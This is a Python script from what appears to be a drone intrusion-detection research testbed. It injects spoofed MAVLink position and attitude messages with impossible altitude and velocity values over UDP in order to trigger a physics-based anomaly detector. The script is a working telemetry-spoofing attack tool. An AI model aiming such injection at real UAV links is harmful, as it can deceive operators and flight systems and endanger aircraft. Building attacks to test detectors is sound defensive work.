"""
experiments/simulation/attacks/attack_fdi.py

Simulates False Data Injection (FDI) Attack:
- Injects physically impossible altitude jumps or acceleration spikes into the MAVLink telemetry stream.
- Triggers Layer 1 Physics Kinematic Invariant violation (Mahalanobis Chi^2 and dynamic acceleration bounds).
"""

import os
import sys
import time
import math
import json
import argparse

MARKER_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".active_attack.json"))

def set_attack_marker(attack_name, active=True):
    try:
        with open(MARKER_FILE, "w") as f:
            json.dump({"attack": attack_name if active else "Benign", "active": active, "time": time.time()}, f)
    except Exception:
        pass

def launch_fdi_attack(target_ip="127.0.0.1", target_port=14552, duration=15):
    try:
        from pymavlink import mavutil
    except ImportError:
        print("[!] pymavlink not installed. Please run: .venv/bin/pip install pymavlink")
        sys.exit(1)

    print("=" * 70)
    print("ATTACK INJECTION: FALSE DATA INJECTION (FDI)")
    print("=" * 70)
    print(f"[*] Target Destination: udp:{target_ip}:{target_port}")
    print(f"[*] Attack Duration    : {duration} seconds")
    print(f"[*] Injection Profile  : High-g coordinate jumps & altitude discontinuity")
    print("[*] Expected Response  : Immediate Layer 1 Invariant RED ALERT in Detector HUD")
    print("=" * 70)

    # Establish MAVLink sender connection
    master = mavutil.mavlink_connection(f"udpout:{target_ip}:{target_port}", source_system=1, source_component=1)

    # Synchronize time_boot_ms with active telemetry link to avoid artificial clock regressions
    base_boot_ms = 0
    try:
        sync_conn = mavutil.mavlink_connection("udpin:0.0.0.0:14550")
        msg = sync_conn.recv_match(type=['GLOBAL_POSITION_INT', 'ATTITUDE'], blocking=True, timeout=1.5)
        if msg and hasattr(msg, 'time_boot_ms'):
            base_boot_ms = msg.time_boot_ms
        sync_conn.close()
    except Exception:
        pass
    if base_boot_ms == 0:
        base_boot_ms = int(time.time() * 1000) & 0x7FFFFFFF

    set_attack_marker("FDI", True)
    try:
        start_time = time.time()
        step = 0
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            
            # Craft physically impossible state
            # Normal drone climbs at ~1-3 m/s. FDI injects 25 m/s jump and 40 m/s^2 acceleration!
            fake_alt_mm = int((20.0 + 35.0 * math.sin(step * 0.5)) * 1000)
            fake_vx_cms = int((15.0 + 25.0 * math.cos(step * 0.7)) * 100)
            fake_vy_cms = int(-20.0 * 100)
            fake_vz_cms = int(30.0 * 100) # 30 m/s vertical dive/climb
            
            time_boot_ms = (base_boot_ms + int(elapsed * 1000)) & 0xFFFFFFFF
            
            # 1. Send spoofed GLOBAL_POSITION_INT
            master.mav.global_position_int_send(
                time_boot_ms,          # time_boot_ms
                int(37.7749 * 1e7),     # lat
                int(-122.4194 * 1e7),   # lon
                fake_alt_mm,            # alt
                fake_alt_mm,            # relative_alt
                fake_vx_cms,            # vx
                fake_vy_cms,            # vy
                fake_vz_cms,            # vz
                9000                    # hdg
            )
            
            # 2. Send spoofed ATTITUDE
            master.mav.attitude_send(
                time_boot_ms,
                math.radians(45.0 * math.sin(step)), # roll
                math.radians(-35.0 * math.cos(step)),# pitch
                math.radians(180.0),                 # yaw
                0.5, 0.5, 0.5
            )
            
            print(f"[FDI INJECTING] t={elapsed:4.1f}s | Spoofed Alt: {fake_alt_mm/1000:5.1f}m | vz: {fake_vz_cms/100:5.1f}m/s | a_est: ~38 m/s²")
            step += 1
            time.sleep(0.1)
    finally:
        set_attack_marker("Benign", False)
        print("\n[+] FDI Attack Injection Complete. Link returning to benign state.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="FDI Attack Injector")
    parser.add_argument("--port", type=int, default=14552, help="Target MAVLink detector port")
    parser.add_argument("--duration", type=int, default=15, help="Duration in seconds")
    args = parser.parse_args()

    launch_fdi_attack(target_port=args.port, duration=args.duration)
